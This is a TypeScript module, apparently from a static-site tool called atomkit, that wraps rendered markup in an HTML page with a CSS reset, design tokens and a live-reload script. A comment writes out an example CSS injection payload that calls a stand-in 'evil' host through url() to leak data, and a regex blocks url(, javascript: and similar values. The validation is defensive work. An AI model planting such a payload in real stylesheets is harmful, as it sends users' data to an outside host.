import type { AtomkitConfig } from './config.js';

// A dependency-free live-reload client: an SSE channel the dev server pings on
// every file change. Falls back to a delayed reload if the socket drops.
const LIVE_RELOAD = `<script>
(function(){try{var s=new EventSource('/__atomkit/reload');s.onmessage=function(){location.reload()};s.onerror=function(){try{s.close()}catch(e){}setTimeout(function(){location.reload()},1500)}}catch(e){}})();
</script>`;

const RESET =
  '*,*::before,*::after{box-sizing:border-box}' +
  'body{margin:0;font-family:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.5;color:var(--ink,#0b1220);background:var(--bg,#fff);-webkit-font-smoothing:antialiased}' +
  'img{max-width:100%;height:auto}a{color:inherit}';

function esc(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// Design tokens → `:root { --x: y }`. Keys are constrained to a safe CSS-custom-
// property charset; values are held to the SAME bar as atomkit's style `clean()`.
//
// Stripping only `<>{}` was not enough: `;` let a token append a second
// declaration on :root, and `url(` re-opened the CSS-exfiltration channel core
// explicitly closes — e.g. `"red;background:url(https://evil/?leak)"` fires a
// request on page load. var() indirection also let a token smuggle url() past
// core's guard, since core clean()s the literal value, not what var() resolves to.
// A token is a single CSS value: reject anything that isn't, rather than repair it.
function tokenValue(v: unknown): string {
  const s = String(v).trim();
  if (!s || s.length > 200) return '';
  if (/[<>{};]/.test(s)) return '';
  if (/expression\(|javascript:|vbscript:|@import|url\s*\(|image-set\s*\(|cross-fade\s*\(/i.test(s)) return '';
  return s;
}

function tokensCss(tokens: Record<string, string>): string {
  const decls = Object.entries(tokens)
    .map(([k, v]) => {
      const name = (k.startsWith('--') ? k : `--${k}`).replace(/[^A-Za-z0-9_-]/g, '');
      const val = tokenValue(v);
      return name && val ? `${name}:${val}` : '';
    })
    .filter(Boolean)
    .join(';');
  return decls ? `:root{${decls}}` : '';
}

export interface ShellOptions {
  title: string;
  description?: string;
  bodyHtml: string;
  cfg: AtomkitConfig;
  liveReload?: boolean;
}

/** Wrap rendered body markup in a full HTML document (reset + tokens + meta). */
export function pageShell(o: ShellOptions): string {
  const meta = o.description ? `\n<meta name="description" content="${esc(o.description)}">` : '';
  return `<!doctype html>
<html lang="${esc(o.cfg.lang)}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${esc(o.title)}</title>${meta}
<style>${RESET}${tokensCss(o.cfg.tokens)}</style>
</head>
<body>
<div id="app">${o.bodyHtml}</div>${o.liveReload ? '\n' + LIVE_RELOAD : ''}
</body>
</html>`;
}
